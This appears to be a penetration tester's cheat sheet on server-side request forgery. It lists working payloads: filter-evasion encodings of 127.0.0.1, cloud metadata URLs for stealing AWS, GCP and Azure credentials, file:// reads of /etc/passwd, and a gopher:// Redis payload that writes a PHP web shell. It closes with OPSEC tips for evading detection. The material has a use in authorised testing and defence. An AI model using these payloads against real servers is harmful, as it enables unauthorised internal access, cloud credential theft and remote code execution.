# Server-Side Request Forgery (SSRF)
**Concept:** SSRF occurs when an attacker forces a vulnerable server to make HTTP (or other protocol) requests on their behalf. 
**Target:** Internal loopback interfaces (`127.0.0.1`), internal network segments, or Cloud Metadata Services (AWS/GCP/Azure). 
**Impact:** Internal Port Scanning, Cloud Credential Theft, Remote Code Execution (via Gopher/Redis).
## 1. Identification (Reconnaissance)
**Goal:** Identify input vectors that fetch remote resources. 
**Vectors:** Webhooks, PDF Generators, Document Parsers, "Upload from URL", Link Previews.
### Verification (Burp Collaborator)
Inject an out-of-band payload to confirm the server can make outbound requests.
```http
POST /api/image/upload HTTP/1.1
...
url=http://<YOUR_COLLABORATOR_ID>.oastify.com
```
## 2. Local Exploitation (Internal Recon)
**Goal:** Access services running on the loopback interface that are blocked from the outside (e.g., Admin Panels, Redis, MongoDB).
### Basic Localhost Access
```txt
http://127.0.0.1:80
http://localhost:22
http://[::1]:8080
```
### Filter Evasion (Bypassing "localhost" blocklists)
If the string "localhost" or "127.0.0.1" is blocked, use alternative encodings.

| **Method**              | **Payload**               | **Description**                                 |
| ----------------------- | ------------------------- | ----------------------------------------------- |
| *Decimal IP*            | `http://2130706433`       | `127.0.0.1` converted to decimal.               |
| *Octal IP*              | `http://0177.0.0.1`       | Octal representation.                           |
| *Hex IP*                | `http://0x7f000001`       | Hex representation.                             |
| *DNS Wildcard*          | `http://127.0.0.1.nip.io` | Resolves to 127.0.0.1 but looks like a domain.  |
| *Enclosed Alphanumeric* | `http://①②⑦.⓪.⓪.①`        | Unicode enclosure bypass.                       |
| *Short Hand*            | `http://0/`               | Often resolves to 0.0.0.0 (localhost) on Linux. |
## 3. Cloud Exploitation (Metadata Extraction)
**Goal:** Steal temporary credentials from the Cloud Instance Metadata Service (IMDS). 
**Criticality:** High. This often leads to full cloud environment compromise.
### AWS (Amazon Web Services)
**Target:** EC2 Metadata Service.
- **IMDSv1 (Legacy):**
```http
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```
- **IMDSv2 (Modern):** Requires a token header. Harder to exploit via simple SSRF unless you can inject headers (CRLF Injection).
### GCP (Google Cloud Platform)
**Constraint:** Requires the `Metadata-Flavor: Google` header.
```http
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
- _Bypass:_ If you cannot inject headers, try using the beta endpoint (older) or chaining with CRLF injection.
### Azure
**Constraint:** Requires the `Metadata: true` header.
```http
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
## 4. Protocol Smuggling (Gopher & File)
**Goal:** Escalate from HTTP-only access to reading files or executing commands on internal services (Redis, SMTP).
### File Wrapper (`file://`)
Read local files if the application library allows it.
```txt
file:///etc/passwd
file:///C:/Windows/win.ini
```
### Gopher Wrapper (`gopher://`)
**Concept:** Construct raw TCP packets to talk to non-HTTP services. **Tool:** `Gopherus` (Automates payload generation).
**Scenario: RCE via Redis**
1. **Generate Payload:**
```shell
gopherus --exploit redis
# Select "PHPShell" and web root path
```
2. **Inject Payload:**
```http
url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
```
3. **Result:** Writes a PHP shell to the web root.
## 5. Blind SSRF
**Concept:** The application performs the request but does not return the response body to you. 
**Goal:** Reconnaissance and "Time-Based" inference.
### Port Scanning (Time-Based)
Infer open ports by measuring response time.
- **Open Port:** Server responds immediately (Fast).
- **Closed Port:** Server waits for timeout or RST (Slow/Variable).
### Shellshock via SSRF
If the internal server is vulnerable to Shellshock, you can exploit it even blindly by injecting the payload into the `User-Agent` or other headers, provided you can control them via the SSRF vector.
## OPSEC Warnings
1. **Noise:** Scanning `127.0.0.1` /16 or /24 generates massive logs on the local server.
2. **Cloud Alarms:** Accessing `169.254.169.254` is heavily monitored by Cloud GuardDuty/Security Center. It triggers immediate high-severity alerts.
3. **Recursive DoS:** Pointing the SSRF back at the application's own URL can cause infinite loops and crash the service.